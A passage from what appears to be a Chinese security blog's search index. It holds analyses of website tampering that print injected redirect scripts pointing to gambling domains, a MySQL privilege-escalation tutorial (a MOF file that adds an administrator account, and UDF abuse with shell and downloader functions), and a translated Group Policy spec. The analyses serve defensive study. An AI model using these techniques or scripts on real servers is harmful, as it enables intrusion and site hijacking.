\u003ctitle\u003e正在进入\u003c/title\u003e \u003cmeta name=\"description\" content=\"正在进入\"\u003e \u003cmeta name=\"keywords\" content=\"正在进入\"\u003e \u003clink href=\"\" rel=\"stylesheet\"\u003e \u003cscript language=\"javascript\"\u003e times=1 setInterval(\"times++\",100) b=1 var autourl=new Array() // 检测的站点 autourl[1]=\"https://js29042.com/?aff=999313\" autourl[2]=\"https://js29033.com/?aff=999313\" autourl[3]=\"https://js29030.com/?aff=999313\" autourl[4]=\"https://js29033.com/?aff=999313\" autourl[5]=\"https://js29042.com/?aff=999313\" autourl[6]=\"https://js29030.com/?aff=999313\" autourl[7]=\"https://js29042.com/?aff=999313\" // 判断第一个反应的网站并进行跳转 function auto(url){ window.location.replace(url); b++ } // 进行故意错误请求并得到反应速度 function run(){ for(var i=1;i\u003cautourl.length;i++) document.write(\"\u003cimg src=http://\"+autourl[i].split(\"//\")[1].split(\"/\")[0]+\"/\"+Math.random()+\" width=1 height=1 onerror=auto('\"+autourl[i]+\"')\u003e\") } run() \u003c/script\u003e \u003c/head\u003e \u003cbody\u003e \u003c!-- \u003ca href=\"\" target=\"_blank\" onclick=\"run()\"\u003e\u003c/a\u003e --\u003e \u003c/body\u003e \u003c/html\u003e分析可知，篡改作者设置了可用性检测，对一批BoCai网轮询，并跳转第一个可访问的BoCai站点。\n最后的BoCai网站 最终使用户跳转到BoCai网站。 https://js29042.com/?aff=999313 测试发现aff参数为推广码，该推广码可用于定位页面篡改作者。\nIOCS bcdas8.com js29033.com js29030.com js29042.com welcomejs.com\n",
    "description": "",
    "tags": "红蓝对抗,页面篡改",
    "title": "页面篡改分析-短链接多级跳转",
    "uri": "/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E7%9F%AD%E9%93%BE%E6%8E%A5%E5%A4%9A%E7%BA%A7%E8%B7%B3%E8%BD%AC/index.html"
  },
  {
    "content": "首次会话跳转菠菜页面篡改分析 前言 在某会曾经出现过一次基于运营商的某度广告推广导致手机平台恶意跳转现象，本次样本发现了一处类似的现象，对其分析发现通过脚本实现的首次跳转功能。下面是详细过程。 可以看到，整个跳转流程。现在需要做的就是分析其中原理。 发生跳转第一步，在我访问弱点网站的时候自动跳转到了\n倒序回溯 https://www.01321zq[.]com 菠菜 Referer:https://tz01321[.]com/zh-cn/ https://tz01321[.]com 301 location https://tz01321[.]com/zh-cn/ https://tz01321[.]com Referer\thttps://sdfhu1[.]com/248486.html https://sdfhu1[.]com/248486.html Referer\t弱点网站定位篡改点 现在就是确定具体被篡改的位置了： 可以看到这个/statics/js/jquery.min.js文件内被插入下面这段代码，并且根据逻辑可以知道，在用户第一次访问的时候触发此脚本，客户跳转至https[:]//sdfhu1[.]com/248486.html ，同时添加设置cookie,打标非第一次访问，这样下次访问就不会触发此跳转。\nvar c = documen[t.c]ookie; if (c.indexOf('isfirstvisited=false') != -1) { } else { var d = new Date(); d.setFullYear(d.getFullYear() + 1); documen[t.c]ookie = 'isfirstvisited=false;expires=' + d.toGMTString(); location = 'https[:]//sdfhu1[.]com/248486.html' }下面为该脚本在源代码的位置： 除了上面的脚本，我们在/statics/js/dialog.js中发现了这样一段，开始怀疑但最后证明仍然为篡改菠菜网站相关： 其中引入了这样一段，而直接访问该脚本不显示任何内容，因此暂时未知其功能：\ninclude(\"http[:]//www[.]oydaiyun[.]com/images/js.js\");oydaiyun[.]com referer http[:]//www[.]oydaiyun[.]com/images/js.js 分析过程 graph LR A[弱点网站,jquery.min.js判断首次访问]--\u003e|yes|B[sdfhu1.com/248486.html] A--\u003e|no|C[cookie打标非首次访问] B--\u003eD[tz01321[.]com] D--\u003eE[01321zq.com菠菜]至此，已经明确了跳转的全过程，修复建议针对被插入页面，及无用js进行清理，同时应对服务器进行全盘后门清理以及漏洞检测，并且应尽量覆盖等保项目日常安检。\nIOCs: oydaiyun[.]com sdfhu1[.]com tz01321[.]com\n",
    "description": "",
    "tags": "红蓝对抗,页面篡改",
    "title": "页面篡改分析-首次会话跳转菠菜页面篡改分析",
    "uri": "/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E9%A6%96%E6%AC%A1%E4%BC%9A%E8%AF%9D%E8%B7%B3%E8%BD%AC%E8%8F%A0%E8%8F%9C%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/index.html"
  },
  {
    "content": " 学习Mysql提权小结一下，基本过程。明确了基本思路和方式方法。\n1. mof提权 原理： 利用了c:/windows/system32/wbem/mof/目录下的 nullevt.mof 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。\n条件： mysql注入可执行，存在可读写目录，可上传，。\n影响范围： 操作系统 win2003可（因为需要访问到system32中目录） 数据库为mysql且知道mysql登录账号密码和允许外连\n方式方法： 构造mof\n#pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\") instance of __EventFilter as $EventFilter { EventNamespace = \"Root\\\\Cimv2\"; Name = \"filtP2\"; Query = \"Select * From __InstanceModificationEvent \" \"Where TargetInstance Isa \\\"Win32_LocalTime\\\" \" \"And TargetInstance.Second = 5\"; QueryLanguage = \"WQL\"; }; instance of ActiveScriptEventConsumer as $Consumer { Name = \"consPCSV2\"; ScriptingEngine = \"JScript\"; ScriptText = \"var WSH = new ActiveXObject(\\\"WScript.Shell\\\")\\nWSH.run(\\\"net.exe user xtpeeps xtpeeps.cn /add \u0026 net.exe localgroup administrators xtpeeps /add\\\")\"; }; instance of __FilterToConsumerBinding { Consumer = $Consumer; Filter = $EventFilter; };执行了这两句：\nnet.exe user xtpeeps xtpeeps.cn /addnet.exe localgroup administrators xtpeeps /add 上传构造的mof文件到可读写的目录下。\nselect load_file(\"C:/php/APMServ5.2.6/www/htdocs/1.mof\") into dumpfile \"c:/windows/system32/wbem/mof/nullevt.mof\" 相关问题： mof是WMI存储库的托管对象格式。\n参考： mof提权原理及实现\nMYSQL提权总结 | waitalone.cn\n2. UDF提权 原理： UDF（用户定义函数）是一类对MYSQL服务器功能进行扩充的代码，通常是用C（或C++）写的。通过添加新函数，性质就象使用本地MYSQL函数abs()或concat()。当你需要扩展MYSQL服务器功能时，UDF通常是最好的选择。但同时，UDF也是黑客们在拥有低权限mysql账号时比较好用的一种提权方法。 ####条件：\n目标主机系统是Windows（Win2000、XP、Win2003）。 拥有该主机mysql中的某个用户账号，该账号需要有对mysql的insert和delete权限。 影响范围： mysql\u003c=5.1\n方式方法： 获取当前mysql的一个账号，一般情况下在网站的config.php文件就能找到（具体在哪个文件每个CMS都不一样）。\n把udf专用的webshell传到服务器上（提示 “上传失败、原因:Result consisted of more than one row”、实际上大多数已上传成功），再连接mysql执行命令。\n连接成功后，导出DLL文件。\nmysql\u003c5.0，导出路径随意；\n5.0\u003c=mysql\u003c5.1，则需要导出至目标服务器的系统目录（如：system32），否则在下一步操作中你会看到“No paths allowed for shared library”错误；mysql\u003e5.1，需要使用\nshow variables like '%plugin%';mysql版本 \u003c 5.2 , UDF导出到系统目录c:/windows/system32/\nmysql版本 \u003e 5.2 ，UDF导出到安装路径MySQL\\Lib\\Plugin\n语句查看插件安装路径，导出的时候指定DLL路径为插件路径。\n使用SQL语句创建自定义函数。语法如下：\nCreate Function 函数名 returns string soname ‘导出的DLL路径’; e.g. Create Function cmdshell returns string soname 'udf.dll'; -----------或者 Create function MyCmd returns string soname \"udf.dll\"; Select MyCmd(\"CMD命令\"); Drop function MyCmd;cmdshell 执行cmd; downloader 下载者,到网上下载指定文件并保存到指定目录; open3389 通用开3389终端服务,可指定端口(不改端口无需重启); backshell 反弹Shell; ProcessView 枚举系统进程; KillProcess 终止指定进程; regread 读注册表; regwrite 写注册表; shut 关机,注销,重启; about 说明与帮助函数;若mysql\u003e=5.0，语句中的DLL不允许带全路径，如果在第二步中已将DLL导出到系统目录，那么你就可以省略路径而使命令正常执行，否则将会看到”Can’t open shared library“错误。 如果提示“Function ‘cmdshell’ already exists”，则输入下列语句可以解决：\ndelete from mysql.func where name='cmdshell' 创建函数成功后，就可以通过sql语句去调用它了。语法如下：\nselect 创建的函数名 (‘参数列表’); // e.g. select cmdshell(“net user ghy459 hack0nair /add”); 创建一个用户ghy459，密码为hack0nair\n函数使用完后，我们需要把之前生成的DLL和创建的函数删除掉，但要注意次序，必须先删除函数再删除DLL。删除函数的语法如下：\ndrop function 创建的函数名; // e.g. drop function cmdshell;\n相关问题： 导出的文件名不一定非是xxx.dll，可以是任意的。\ncreate function sys_eval returns string soname 'udf.xox'; 提示错误 Can’t open shared library ‘fun.dll’ (errno: 2 )\n除了udf不存在、udf被杀，还有可能是你的udf版本不对，你拿32位的udf去在64位系统注册的话，一样会提示错误。\n降权的mysql一样有用，能注册dll的话你一样能够执行命令，不过权限是根据mysql来的， 在不支持aspx，ws、shell.application被删得情况下还有一丝希望。\n某些情况下，我们会遇到Can’t open shared library的情况，这时就需要我们把udf.dll导出到lib\\plugin目录下才可以，但是默认情况下plugin不存在，怎么办？ 还好有大牛研究出了利用NTFS ADS流来创建文件夹的方法\nselect @@basedir; //查找mysql的目录 select 'It is dll' into dumpfile 'C:\\\\Program Files\\\\MySQL\\\\MySQL Server 5.1\\\\lib::$INDEX_ALLOCATION'; //使用NTFS ADS流创建lib目录 select 'It is dll' into dumpfile 'C:\\\\Program Files\\\\MySQL\\\\MySQL Server 5.1\\\\lib\\\\plugin::$INDEX_ALLOCATION'; //利用NTFS ADS再次创建plugin目录 执行成功以后再进行导出即可。 直接执行\ncreate function sys_eval returns string soname 'udf.dll'若成功则可直接执行命令。 mysql版本小于5.1此方法一般不成功，则需要导入dll到系统目录，一般导入到c:\\windows\\system32\\，如果不可写入则试试c:\\windows\\（一般5.0一下放这）。\ncreate table a (cmd LONGBLOB); insert into a (cmd) values (hex(load_file('D:\\\\Program Files\\\\MySQL\\\\MySQL Server 5.0\\\\Lib\\\\Plugin\\\\lib_mysqludf_sys.dll'))); SELECT unhex(cmd) FROM a INTO DUMPFILE 'c:\\\\windows\\\\system32\\\\udf.dll'; create function sys_eval returns string soname 'udf.dll' select sys_eval('ipconfig'); 参考： http://blog.csdn.net/wulex/article/details/54868131\n",
    "description": "",
    "tags": "红蓝对抗",
    "title": "Mysql提权小结",
    "uri": "/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-%E5%90%8E%E6%B8%97%E9%80%8F_MYSQL%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - 红蓝对抗",
    "uri": "/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/index.html"
  },
  {
    "content": "原文由于没有中文版，因此这里手工整理翻译了一下全文方便大佬们后续参考。\n原文：[MS-GPSB] 组策略安全扩展协议\n组策略：安全\n1. 介绍 本文档指定组策略：核心协议的组策略：安全协议扩展，如[MS-GPOL]中所指定。\n1.1 词汇表 Active directory 通用目录服务的Windows实现，它使用LDAP作为其主要访问协议。Active Directory存储有关网络中各种对象的信息，如用户帐户、计算机帐户、组以及Kerberos[MS-KILE]使用的所有相关凭据信息。Active Directory可以作为Active Directory域服务（AD DS）或Active Directory轻量级目录服务（AD LDS）部署，这两种服务在[MS-ADOD]:Active Directory协议概述中都有描述。\nActive Directory object 在[MS-ADTS]第3.1.1节中定义的Active Directory中使用的一组目录对象。Active Directory对象可以通过DSName标识。另请参见目录对象。\nattribute 某些对象或实体的特征，通常编码为名称/值对。\nclass 与键关联的用户定义的二进制数据。\nclient 客户端，也称为客户端计算机，是接收并应用[MS-GPOL]中指定的组策略对象(GPO)设置的计算机。\nCSE GUID client-side extension 客户端扩展GUID（CSE GUID）：一种GUID，它使组策略客户端上的特定客户端扩展能够与存储在组策略服务器上的组策略对象(GPO)的逻辑和物理组件中的策略数据相关联。\nDACL 自主访问控制列表(DACL)：由对象所有者控制的访问控制列表(ACL)，它指定特定用户或组可以对该对象进行的访问。\nDomain 域：共享公共名称空间和管理基础结构的一组用户和计算机。该组中至少有一个计算机成员必须充当域控制器(DC)并承载标识域所有成员的成员列表，还必须可选地承载Active Directory服务。域控制器提供成员身份验证，为其成员创建信任单元。每个域都有一个在其成员之间共享的标识符。有关更多信息，请参见[MS-AUTHSOD]节1.1.1.5和[MS-ADTS]。\nDC 域控制器(DC)：在实现Active Directory的服务器上运行的服务，或承载此服务的服务器。该服务托管对象的数据存储，并与其他DC进行互操作，以确保对对象的本地更改在所有DC之间正确复制。当Active Directory作为Active Directory域服务（AD DS）运行时，DC包含其林中的配置命名上下文（配置NC)、架构命名上下文（架构NC）和一个域NC的完整NC副本。如果AD DS DC是全局编录服务器（GC服务器），则它包含其林中剩余域NC的部分NC副本。有关更多信息，请参见[MS-AUTHSOD]节1.1.1.5.2和[MS-ADTS]。当Active Directory作为Active Directory轻型目录服务（AD LDS）运行时，多个AD LDS DC可以在一台服务器上运行。当Active Directory作为AD DS运行时，一台服务器上只能运行一个AD DS DC。但是，多个AD LDS DC可以与一个AD DS DC共存在一台服务器上。AD LDS DC在其林中包含配置NC和架构NC的完整NC副本。域控制器是身份验证协议域支持[MS-APDS]的服务器端。\nGUID 全局唯一标识符(GUID)：在Microsoft协议技术文档(TDs)中与通用唯一标识符(UUID)互换使用的术语。交换这些术语的用法并不意味着或要求特定的算法或机制来生成值。具体来说，使用这个术语并不意味着或要求必须使用[RFC4122]或[C706]中描述的算法来生成GUID。另请参见通用唯一标识符(UUID)。\nGroup Policy 组策略：允许实现者为Active Directory服务环境中的用户和计算机指定托管配置的机制。\nGroup Policy Object 组策略对象(GPO)：管理员定义的策略设置规范的集合，可以应用于域中的计算机组。每个GPO包括两个元素：驻留在域的Active Directory中的对象，以及驻留在域的组策略服务器的sysvol DFS共享中的相应文件系统子目录。\nLightweight Directory Access Protocol 轻量级目录访问协议(LDAP)：Active Directory的主要访问协议。轻量级目录访问协议(LDAP)是由Internet工程任务组(IETF)建立的行业标准协议，它允许用户查询和更新目录服务(DS)中的信息，如[MS-ADTS]所述。轻量级目录访问协议可以是版本2[RFC1777]或版本3[RFC3377]。\nrelative identifier 相对标识符(RID)：安全标识符(SID)[SIDD]中子权限值系列中的最后一项。它将一个帐户或组与域中的所有其他帐户和组区分开来。任何域中没有两个帐户或组共享同一个RID。\nsecurity identifier 安全标识符(SID)：用于标识帐户或组的安全主体的标识符。概念上，SID由帐户授权部分（通常是域）和一个较小的整数组成，该整数表示相对于帐户授权的标识，称为相对标识符(RID)。SID格式在[MS-DTYP]第2.4.2节中指定；SIDs的字符串表示在[MS-DTYP]节2.4.2和[MS-AZOD]节1.1.1.2中指定。\nsecurity policy 安全策略：以安全策略设置集合的形式，策略本身表达了关于如何保护网络上的计算机和资源的管理意图。\nsecurity policy settings 安全策略设置：包含在安全策略中，策略设置是如何配置计算机上各种安全相关参数的实际表达。\nServer Message Block (SMB) 服务器消息块(SMB)：一种协议，用于通过网络从服务器系统请求文件和打印服务。SMB协议通过附加的安全性、文件和磁盘管理支持扩展了CIFS协议。有关更多信息，请参见[CIFS]和[MS-SMB]。\nshare 共享：由公共Internet文件系统(CIFS)服务器提供的供CIFS客户端通过网络访问的资源。共享通常表示目录树及其包含的文件（通常称为“磁盘共享”或“文件共享”）或打印机（“打印共享”）。如果有关共享的信息保存在持久存储区（例如，Windows注册表）中，并在重新启动文件服务器时重新加载，则该共享称为“粘性共享”。有些共享名是为特定功能保留的，被称为特殊共享:IPC$（为进程间通信保留）、ADMIN$（为远程管理保留）和a$、B$、C$（以及后面跟着美元符号的其他本地磁盘名），分配给本地磁盘设备。\nsystem access control list 系统访问控制列表(SACL)：一个访问控制列表(ACL)，它控制对试图访问安全对象的审计消息的生成。获取或设置对象的SACL的能力由通常仅由系统管理员拥有的特权控制。\nMAY, SHOULD, MUST, SHOULD NOT, MUST NOT 可以、应该、必须、不应该、不得：这些术语（在所有上限中）按照[RFC2119]中的定义使用。所有可选行为的语句都使用可能、应该或不应该。\n1.2 参考文献 1.2.1 规范性参考文献 我们经常对规范性参考文献进行调查，以确保它们的持续可用性。如果您在寻找规范引用方面有任何问题，请联系dochelp@microsoft.com。我们将协助您查找相关信息。\n[MS-ADTS] Microsoft Corporation, “Active Directory Technical Specification”.\n[MS-DTYP] Microsoft Corporation, “Windows Data Types”.\n[MS-EVEN] Microsoft Corporation, “EventLog Remoting Protocol”.\n[MS-GPOL] Microsoft Corporation, “Group Policy: Core Protocol”.\n[MS-LSAD] Microsoft Corporation, “Local Security Authority (Domain Policy) Remote Protocol”.\n[MS-RRP] Microsoft Corporation, “Windows Remote Registry Protocol”.\n[MS-SAMR] Microsoft Corporation, “Security Account Manager (SAM) Remote Protocol (Client-to-Server)”.\n[MS-SCMR] Microsoft Corporation, “Service Control Manager Remote Protocol”.\n[MS-SMB2] Microsoft Corporation, “Server Message Block (SMB) Protocol Versions 2 and 3”.\n[MS-SMB] Microsoft Corporation, “Server Message Block (SMB) Protocol”.\n[RFC1510] Kohl, J., and Neuman, C., “The Kerberos Network Authentication Service (V5)”, RFC 1510, September 1993, http://www.ietf.org/rfc/rfc1510.txt\n[RFC2119] Bradner, S., “Key words for use in RFCs to Indicate Requirement Levels”, BCP 14, RFC 2119, March 1997, http://www.rfc-editor.org/rfc/rfc2119.txt\n[RFC2251] Wahl, M., Howes, T., and Kille, S., “Lightweight Directory Access Protocol (v3)”, RFC 2251, December 1997, http://www.ietf.org/rfc/rfc2251.txt\n[RFC4234] Crocker, D., Ed., and Overell, P., “Augmented BNF for Syntax Specifications: ABNF”, RFC 4234, October 2005, http://www.rfc-editor.org/rfc/rfc4234.txt\n1.2.2 信息量大的参考文 [MSDN-INF] Microsoft Corporation, “About INF Files”, http://msdn.microsoft.com/en-us/library/aa376858.aspx\n[MSDN-PRIVS] Microsoft Corporation, “Authorization Constants”, http://msdn.microsoft.com/en-us/library/aa375728.aspx\n1.3 概述 1.3.1 背景 [MS-GPOL]中指定的组策略：核心协议使客户端能够发现和检索域管理员创建的策略设置。这些设置在分配给Active Directory中的策略目标帐户的组策略对象中传播。策略目标帐户是Active Directory中的计算机帐户或用户帐户。每个客户端使用轻量级目录访问协议(LDAP)通过查阅与每个客户端的计算机帐户对应的Active Directory对象和登录到客户端计算机的任何用户的用户帐户来确定适用于它的GPO。\n在每个客户端上，每个GPO都由称为客户端插件的软件组件解释和作用。负责给定GPO的客户端插件是通过使用GPO上的属性指定的。此属性指定全局唯一标识符(GUID)对的列表。每对的第一个GUID称为客户端扩展GUID（CSE GUID）。每对的第二个GUID称为工具扩展GUID。\n对于适用于客户端的每个GPO，客户端都会参考GPO中列出的CSE GUID，以确定客户端上的哪些客户端插件将处理GPO。然后，客户端调用客户端插件来处理GPO。\n客户端插件使用GPO的内容以特定于其类的方式检索特定于其类的设置。检索到其特定于类的设置后，客户端插件使用这些设置执行特定于类的处理。\n1.3.2 安全扩展概述 安全策略包含设置（协议配置），这些设置使基础安全组件能够强制执行以下内容：\n§ 密码、帐户锁定和Kerberos策略。\n§ 系统审核设置。\n§ 特权和权利分配。\n§ 应用程序安全配置数据值和安全描述符。\n§ 事件日志设置。\n§ 安全组成员资格。\n§ 长时间运行的进程和程序的配置信息，以及它们上的安全描述符。\n§ 文件和文件夹安全描述符。\n以下主要步骤用于安全配置：\n§ 安全策略编写。\n§ 安全策略分配。\n§ 安全策略分发。\n安全策略创作是通过组策略：核心协议的管理工具启用的，该管理工具具有特定于该协议的行为的管理插件。该插件允许管理员在用户界面中编写安全策略。然后，插件将安全策略保存到标准格式的。inf文件中，并将它们存储在可以使用服务器消息块(SMB)协议访问的网络位置上，如[MS-SMB]中指定的那样。\n安全策略分配由组策略：核心协议管理工具执行，该工具构造GPO，如[MS-GPOL]第2.2.8.1节所述。每个GPO都包含一个对网络位置的引用，其中包含由管理工具插件生成的安全策略文件。\n安全策略分发涉及客户端计算机上相应的特定于协议的组策略插件，调用该插件来处理引用安全策略设置的任何GPO。安全协议客户端插件提取GPO中指定的网络位置，使用SMB协议传输安全策略文件，然后使用安全策略文件配置客户端的安全设置。\n1.4 与其他议定书的关系 此协议依赖于[MS-GPOL]中指定的组策略：核心协议。它还依赖于[MS-SMB]中指定的SMB协议，用于在客户端和GP服务器之间传输组策略设置和指令。\n1.5 先决条件 组策略：安全协议扩展的先决条件与组策略：核心协议的先决条件相同。\n1.6 适用性声明 组策略：安全协议扩展仅适用于组策略框架。\n1.7 版本控制和能力协商 组策略：安全协议扩展不对收到的安全策略执行任何显式版本检查\n1.8 供应商-可扩展字段 组策略：安全协议扩展不定义任何供应商可扩展字段。\n1.9 标准作业 组策略：Security Protocol Extension定义CSE GUID和工具扩展GUID，如[MS-GPOL]第1.8节所述。下表显示了工作分配。\nParameter Value CSE GUID {827D319E-6EAC-11D2-A4EA-00C04F79F83A} Tool extension GUID (computer policy settings) {803E14A0-B4FB-11D0-A0D0-00A0C90F574B} 2. 信息 2.1 运输 组策略：安全协议扩展应\u003c1\u003e根据[MS-SMB2]中指定的服务器消息块(SMB)版本2和3协议通过组策略协议传输消息（文件形式）。客户端插件必须使用该协议的CSE GUID（如[MS-DTYP]第2.3.4节中指定的那样），管理工具插件必须使用工具扩展GUID。\n组策略：核心协议使用该协议的CSE GUID和工具扩展GUID值（参见1.9节）来调用该协议，仅用于访问需要由该协议处理的GPO。\n2.2 消息语法 组策略：安全协议扩展中交换的消息对应于使用SMB协议传输的安全策略文件。协议是通过这些消息的交换来驱动的，如第3节所述。\n组策略：安全协议扩展处理的所有安全策略文件必须使用UTF-16LE编码，并带有字节顺序标记(0xFFFE)。inf文件语法如下所示。\nInfFile = UnicodePreamble VersionPreamble Sections UnicodePreamble = *(\"[Unicode]\" LineBreak \"Unicode=yes\" LineBreak) VersionPreamble = \"[Version]\" LineBreak \"signature=\" DQUOTE \"$CHICAGO$\" DQUOTE LineBreak \"Revision=1\" LineBreak Sections = Section / Section Sections Section = Header Settings Header = \"[\" HeaderValue \"]\" LineBreak HeaderValue = StringWithSpaces Settings = Setting / Setting Settings Setting = Key Wsp \"=\" Wsp ValueList LineBreak / Name \",\" Mode \",\" AclString LineBreak Name = String / QuotedString Mode = [0-9]+ AclString = SDDL / DQUOTE SDDL DQUOTE ValueList = Value / Value Wsp \",\" Wsp ValueList Key = String Value = String / QuotedString前面的语法是以增强的Backus-Naur形式(ABNF)语法给出的，如[RFC4234]中所规定的，并由以下规则增强。\nLineBreak = CRLF String = *(ALPHANUM / %d47 / %d45 / %d58 / %d59) StringWithSpaces = String / String Wsp StringWithSpaces QuotedString = DQUOTE *(%x20-21 / %x23-7E) DQUOTE Wsp = *WSP ALPHANUM = ALPHA / DIGIT有关.inf文件及其用途的详细信息，请参阅[MSDN-INF]。\n协议进一步限制可以分配给HeaderValue的值。必须为HeaderValue分配下表中列出的值之一。\nHeaderValue Purpose System Access 必须包含与帐户锁定、密码策略和本地安全选项有关的设置。 Kerberos Policy 必须包含[RFC1510]中指定的与Kerberos策略相关的设置。 System Log 必须包含与系统日志的最大大小、保留策略等有关的设置。有关更多细节，请参见第2.2.3节。 Security Log 必须包含与安全日志的最大大小、保留策略等有关的设置。有关更多细节，请参见第2.2.3节。 Application Log 必须包含与应用程序日志的最大大小、保留策略等有关的设置。有关更多细节，请参见第2.2.3节。 Event Audit 必须包含与审核策略有关的设置。 Registry Values 必须包含要配置的注册表值。 Privilege Rights 必须包含要分配给特定帐户的特权列表。 Service General Setting 必须包含与服务有关的配置设置。 Registry Keys 必须包含要应用的注册表项及其对应的安全信息的列表。 File Security 必须包含要应用的文件、文件夹及其相应安全信息的列表。 Group Membership 必须包含组成员信息，例如，哪些用户是哪个组的一部分。 注实现这里所述协议客户端的插件不理解它所处理的任何（名称、值）对的语义。它的操作是在由HeaderValue指示的客户端存储区中设置那些命名值。当客户端存储是注册表时，插件不需要知道(name，value)对的可能名称列表。这意味着GP可以创建和填充存储在注册表项中的新安全设置。对于其他存储，该插件维护从设置名称到应用程序编程接口(API)的预编译映射列表。\n2.2.1 系统接入 下列主题指定各种类型的系统访问设置。本节的ABNF必须如下所示。\nHeader = \"[\" HeaderValue \"]\" LineBreak HeaderValue = \"System Access\" Settings = Setting / Setting Settings Setting = Key Wsp \"=\" Wsp Value LineBreak Key = String Value = 1*DIGIT2.2.1.1 密码策略 本节定义指定各种支持的密码策略的设置。表示此类策略的有效密钥的ABNF必须如下所示。\nKey = \"MinimumPasswordAge\" / \"MaximumPasswordAge\" / \"MinimumPasswordLength\" / \"PasswordComplexity\" / \"PasswordHistorySize\" / \"ClearTextPassword\" / \"RequireLogonToChangePassword\" Value = 1*10DIGIT下表提供了对每个有效键值的解释\nSetting key Explanation MaximumPasswordAge 在客户端要求用户更改密码之前，密码可以使用的最大天数。该值必须等于“-1”或在1到999的范围内。值“-1”表示密码永远不会过期。如果最大密码期限值不是“-1”，则最小密码期限必须小于最大密码期限。 MinimumPasswordAge 自密码更改或重置之日起，在客户端必须允许用户更改密码之前，密码可以使用的天数。此值必须介于0和999之间。最小密码期限必须小于最大密码期限，除非最大密码期限设置为-1。 MinimumPasswordLength 用户帐户的密码可以包含的最小字符数。此值必须介于0和2^16之间。值为0表示不需要密码。 PasswordComplexity 标志，指示操作系统是否必须要求密码满足复杂性要求。如果设置了此标志，则指示密码必须满足特定的最低要求。此值必须介于0和2^16之间。值为0表示不适用密码复杂性要求。任何其他有效值都表示适用密码复杂性要求。如果启用此策略，密码必须满足以下最低要求：§ 不能包含用户的帐户名或超过两个连续字符的用户全名部分。§ 长度必须至少为六个字符。§ 必须包含下列三个类别中的字符：§ 英文大写字母（A到Z）。§ 英文小写字符（a到z）。§ 以10位为基数（0到9）。§ 非字母数字字符（例如！、$、#、%)。在更改或创建密码时，必须强制执行复杂性要求。 ClearTextPassword 标志，指示是否必须使用可逆加密来存储密码。此值必须介于0和2^16之间。值0表示密码未使用可逆加密存储。任何其他有效值都表示密码是以可逆加密方式存储的。不建议使用此标志。此策略为使用要求了解用户密码以进行身份验证的协议的应用程序提供支持。通过使用可逆加密存储密码本质上与存储密码的纯文本版本相同。 PasswordHistorySize 在与用户帐户关联重用旧密码之前所需的唯一新密码数。此值必须介于0和2^16之间。值0表示禁用密码历史记录。此策略使管理员能够通过确保旧密码不会持续重复使用来增强安全性。 RequireLogonToChangePassword 设置被忽略。\u003c2\u003e 2.2.1.2 帐户锁定策略 本节定义指定帐户锁定持续时间配置的设置。表示此类策略的有效密钥的ABNF必须如下所示。\nKey = \"LockoutBadCount\" / \"ResetLockoutCount\" / \"LockoutDuration\" / \"ForceLogoffWhenHourExpire\" Value = 1*10DIGIT下表提供了对每个有效键值的解释。\n注所有数值都是十进制的，除非另有明确规定或前面有0x。\nSetting key Explanation ForceLogoffWhenHourExpire 此设置控制当客户端登录时间到期时，是否强制断开与SMB服务器的SMB客户端会话。如果指定了非零值，则启用策略。 LockoutDuration 锁定帐户在自动解锁之前必须保持锁定的分钟数。该值必须为-1或在1到99,999的范围内。如果帐户锁定持续时间值设置为负1，则必须锁定帐户，直到管理员显式解除锁定为止。如果定义了帐户锁定阈值，则帐户锁定持续时间必须大于或等于重置时间resetlockoutcount。此设置仅在指定帐户锁定阈值时才有意义。 LockoutBadCount 失败的登录尝试数，之后必须锁定用户帐户。在管理员重置或帐户的锁定期限到期之前，不得允许已锁定的帐户登录。该值必须介于0和2^16之间。值为0表示该帐户不能被锁定。 ResetLockoutCount 登录尝试失败后必须锁定帐户的分钟数。该值必须在-2^32到2^32的范围内。如果该值为负或零，则不执行重置时间。如果定义了正的帐户锁定阈值，则此重置时间必须小于或等于帐户锁定持续时间lockoutDuration。 2.2.2 Kerberos策略 本节定义允许管理员配置[RFC1510]中指定的用户登录限制的设置。\n本节的ABNF必须如下所示\nHeader = \"[\" HeaderValue \"]\" LineBreak HeaderValue = \"Kerberos Policy\" Settings = Setting / Setting Settings Setting = Key Wsp \"=\" Wsp Value LineBreak Key = \"MaxTicketAge\" / \"MaxRenewAge\" / \"MaxServiceAge\" / \"MaxClockSkew\" / \"TicketValidateClient\" Value = 1*5DIGIT下表提供了对每个有效键值的解释。\n注所有数值都是十进制的，除非另有明确规定或前面有0x。组策略：安全协议扩展实现应使用指定的默认值。\nSetting key Explanation MaxServiceAge 授予的会话票证在过期前使用Kerberos访问服务或资源必须有效的最长时间（分钟）。不能将过期的票证作为服务或资源访问的有效票证接受。有关Kerberos票证身份验证的详细信息如[RFC1510]所述。该值必须大于或等于10，并且小于或等于MaxTicketage的设置。默认为600分钟（10小时）。 MaxTicketAge 用户的票证授予票证(TGT)在过期前可以使用的最长时间（小时）。过期的TGT不能被接受为有效的TGT。默认为10小时。该值必须介于零和99,999之间。 MaxRenewAge 用户的TGT可以续订的时间段（以天为单位）。如果TGT的有效期超过MaxRenewAge天数，则不得续订。默认为7天。该值必须介于零和99,999之间。 MaxClockSkew 必须是客户端时钟时间与提供Kerberos v5身份验证的服务器时钟时间之间的最大时间差（分钟），如[RFC1510]中所指定。默认为5分钟。该值必须介于零和99,999之间。 TicketValidateClient 一个标志，用于确定Kerberos 